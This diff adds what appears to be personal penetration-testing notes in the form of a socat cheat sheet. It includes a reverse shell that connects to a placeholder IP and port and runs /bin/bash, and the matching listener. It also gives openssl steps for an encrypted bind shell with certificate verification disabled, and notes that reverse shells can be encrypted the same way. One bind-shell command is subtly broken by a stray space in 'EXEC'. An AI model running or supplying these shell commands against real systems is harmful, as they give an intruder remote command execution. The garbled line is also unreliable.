@@ -1,0 +1,26 @@
+Reverse shell
+Client
+socat -d -d TCP4-LISTEN:{PORT} STDOUT
+
+Server
+socat TCP4:{IP}:{PORT} EXEC:/bin/bash
+
+Encrypted bind shells
+
+create certificate and key
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+
+Convert to socat format
+
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+
+
+create listener
+
+Server
+socat OPENSSL-LISTEN:{PORT},cert=bind_shell.pem,verify=0,fork EXE C:/bin/bash
+
+Client
+socat - OPENSSL:{IP}:{PORT},verify=0
+
+Seems that we can make a reverse shell encrypted too
